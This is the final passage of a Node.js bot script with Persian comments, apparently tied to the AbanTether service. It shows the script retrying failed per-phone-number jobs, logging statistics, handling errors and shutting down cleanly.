        console.log(`\n🎉 ${phone}: پردازش با موفقیت تکمیل شد!`);
        await this.db.markAsCompleted(phone);
        
      } else {
        // شکست
        this.stats.failed++;
        this.stats.totalProcessed++;
        
        console.error(`\n💥 ${phone}: پردازش ناموفق - ${result.error}`);
        
        // بررسی برای تلاش مجدد
        const retryCount = (user.retryCount || 0) + 1;
        
        if (retryCount >= CONFIG.MAX_RETRIES) {
          // حداکثر تلاش‌ها
          console.log(`⛔ ${phone}: حداکثر تلاش‌ها (${CONFIG.MAX_RETRIES}) انجام شد`);
          await this.db.markAsFailed(phone, result.error, result.step);
        } else {
          // زمان‌بندی تلاش مجدد
          const delay = CONFIG.RETRY_DELAY * retryCount;
          console.log(`🔄 ${phone}: ${delay/1000} ثانیه دیگر دوباره تلاش می‌کنم`);
          
          setTimeout(() => {
            this.addToQueue({ ...user, retryCount });
          }, delay);
        }
      }
      
    } catch (error) {
      console.error(`\n🔥 خطای غیرمنتظره برای ${phone}:`, error.message);
      await this.db.markAsFailed(phone, error.message, 'خطای سیستمی');
      
    } finally {
      // حذف از لیست فعال
      this.activeUsers.delete(phone);
      console.log(`🏁 پردازش ${phone} به پایان رسید\n`);
    }
  }

  showStats() {
    const now = new Date();
    const activeList = Array.from(this.activeUsers);
    
    console.log(`
📊 آمار ربات:
├── کل پردازش‌شده: ${this.stats.totalProcessed}
├── موفق: ${this.stats.successful}
├── ناموفق: ${this.stats.failed}
├── در صف: ${this.queue.length}
├── در حال پردازش: ${activeList.length}
│   ${activeList.length > 0 ? `→ ${activeList.join(', ')}` : ''}
├── آخرین چک: ${this.stats.lastCheck ? this.stats.lastCheck.toLocaleTimeString('fa-IR') : '--'}
└── زمان سرور: ${now.toLocaleTimeString('fa-IR')}
────────────────────────
    `);
  }

  async shutdown() {
    console.log('\n🛑 در حال خاموش کردن ربات...');
    
    // آمار نهایی
    console.log('\n📈 آمار نهایی:');
    console.log(`   کل پردازش‌شده: ${this.stats.totalProcessed}`);
    console.log(`   موفق: ${this.stats.successful}`);
    console.log(`   ناموفق: ${this.stats.failed}`);
    
    // بستن اتصال دیتابیس
    await this.db.disconnect();
    
    console.log('👋 ربات خاموش شد');
    process.exit(0);
  }
}

// ============================================
// 🚀 راه‌اندازی اصلی
// ============================================

// مدیریت خطاها
process.on('uncaughtException', (error) => {
  console.error('🔥 خطای غیرمنتظره:', error.message);
  console.error('📍 Stack:', error.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🔥 Promise رد شد:', reason);
});

// خاموش‌سازی تمیز
process.on('SIGTERM', async () => {
  console.log('\n🛑 دریافت سیگنال خاموشی (SIGTERM)');
  const controller = global.controllerInstance;
  if (controller) {
    await controller.shutdown();
  } else {
    process.exit(0);
  }
});

process.on('SIGINT', async () => {
  console.log('\n🛑 دریافت Ctrl+C (SIGINT)');
  const controller = global.controllerInstance;
  if (controller) {
    await controller.shutdown();
  } else {
    process.exit(0);
  }
});

// اجرای ربات
async function main() {
  try {
    const controller = new MainController();
    global.controllerInstance = controller;
    await controller.start();
    
    // نگه داشتن پروسه فعال
    setInterval(() => {
      // فقط برای زنده نگه داشتن
    }, 60000);
    
  } catch (error) {
    console.error('🔥 خطای بحرانی در راه‌اندازی ربات:', error.message);
    process.exit(1);
  }
}

// اگر فایل مستقیماً اجرا شود
if (require.main === module) {
  main().catch(error => {
    console.error('🔥 خطای اصلی:', error);
    process.exit(1);
  });
}

// Export برای استفاده در ماژول‌های دیگر
module.exports = {
  AbanTetherBot,
  MainController,
  CONFIG
};